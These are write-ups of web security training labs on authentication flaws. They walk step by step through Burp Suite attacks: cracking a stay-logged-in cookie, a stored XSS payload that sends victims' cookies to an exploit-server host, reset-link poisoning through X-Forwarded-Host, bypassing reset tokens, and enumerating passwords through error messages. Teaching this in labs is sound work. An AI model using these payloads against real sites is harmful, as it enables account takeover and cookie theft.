# Vulnerabilities in other authentication mechanisms

In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. For example, users can typically change their password or reset their password when they forget it.

## Keeping users logged in

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

### Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. 

**Solution**
1. With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a *stay-logged-in* cookie.
2. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is *wiener:51dc30ddc473d43a6011e9ebba6ca770*. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:

    ``` base64(username+':'+md5HashOfPassword) ```

3. Log out of your account.
4. Send the most recent *GET /my-account* request to Burp Intruder.
5. In Burp Intruder, add a payload position to the *stay-logged-in* cookie and add your own password as a single payload.
6. Under **Payload processing**, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.

    - Hash: *MD5*
    - Add prefix: *wiener:*
    - Encode: *Base64-encode*

7. As the **Update email** button is only displayed when you access the */my-account* page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. On the **Options** tab, add a grep match rule to flag any responses containing the string *Update email*. Start the attack.
8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9. Make the following adjustments and then repeat this attack:
- Remove your own password from the payload list and add the list of candidate passwords instead.
- Change the **Add prefix** rule to add *carlos:* instead of *wiener:*.
10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing *Update email*. The payload from this request is the valid *stay-logged-in* cookie for Carlos's account.

### Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password.

**Solution**
1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the *stay-logged-in* cookie is Base64 encoded.
2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the *stay-logged-in* cookie, to see that it is constructed as follows:

    ``` username+':'+md5HashOfPassword ```

3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:

    ```html
    <script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
    ```

6. On the exploit server, open the access log. There should be a GET request from the victim containing their *stay-logged-in* cookie.
7. Decode the cookie in Burp Decoder. The result will be:

    ``` carlos:26323c16d5f4dabff3bb136f2460a943 ```

8. Copy the hash and paste it into a search engine. This will reveal that the password is *onceuponatime*.
9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

## Resetting user passwords

In practice, it is a given that some users will forget their password, so it is common to have a way for them to reset it. As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.
There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability.

## Sending passwords by email

The security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. Otherwise, this approach is highly susceptible to man-in-the-middle attacks.

## Resetting passwords using a URL

A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example:

``` http://vulnerable-website.com/reset-password?user=victim-user ```

A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. 

``` http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8 ```

### Password reset broken logic

This lab's password reset functionality is vulnerable. 

**Solution**
1. With Burp running, click the **Forgot your password?** link and enter your own username.
2. Click the **Email client** button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to **Proxy > HTTP history** and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the *POST /forgot-password?temp-forgot-password-token* request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the *temp-forgot-password-token* parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In your browser, request a new password reset and change your password again. Send the *POST /forgot-password?temp-forgot-password-token* request to Burp Repeater again.
6. In Burp Repeater, delete the value of the *temp-forgot-password-token* parameter in both the URL and request body. Change the *username* parameter to *carlos*. Set the new password to whatever you want and send the request.
7. In your browser, log in to Carlos's account using the new password you just set. Click **My account** to solve the lab.

### Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. 

**Solution**
1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
2. Send the *POST /forgot-password* request to Burp Repeater. Notice that the *X-Forwarded-Host* header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the *X-Forwarded-Host* header with your exploit server URL:

    ``` X-Forwarded-Host: your-exploit-server-id.web-security-academy.net ```

5. Change the username parameter to carlos and send the request.
6. Go to the exploit server and open the access log. You should see a *GET /forgot-password* request, which contains the victim's token as a query parameter. Make a note of this token.
7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the *temp-forgot-password-token *parameter to the value that you stole from the victim.
8. Load this URL and set a new password for Carlos's account.
9. Log in to Carlos's account using the new password to solve the lab.

## Changing user passwords

Typically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.

### Password brute-force via password change

This lab's password change functionality makes it vulnerable to brute-force attacks. 

**Solution**
1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
2. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states *Current password is incorrect*. If you enter a valid current password, but two different new passwords, the message says *New passwords do not match*. We can use this message to enumerate correct passwords.
3. Enter your correct current password and two new passwords that do not match. Send this *POST /my-account/change-password* request to Burp Intruder.
4. In Burp Intruder, change the *username* parameter to *carlos* and add a payload position to the *current-password* parameter. Make sure that the new password parameters are set to two different values. For example:

    ``` username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc ```

5. On the **Payloads** tab, enter the list of passwords as the payload set
6. On the **Options** tab, add a grep match rule to flag responses containing *New passwords do not match*. Start the attack.
7. When the attack finished, notice that one response was found that contains the *New passwords do not match* message. Make a note of this password.
8. In your browser, log out of your own account and lock back in with the username *carlos* and the password that you just identified.
9. Click **My account** to solve the lab.
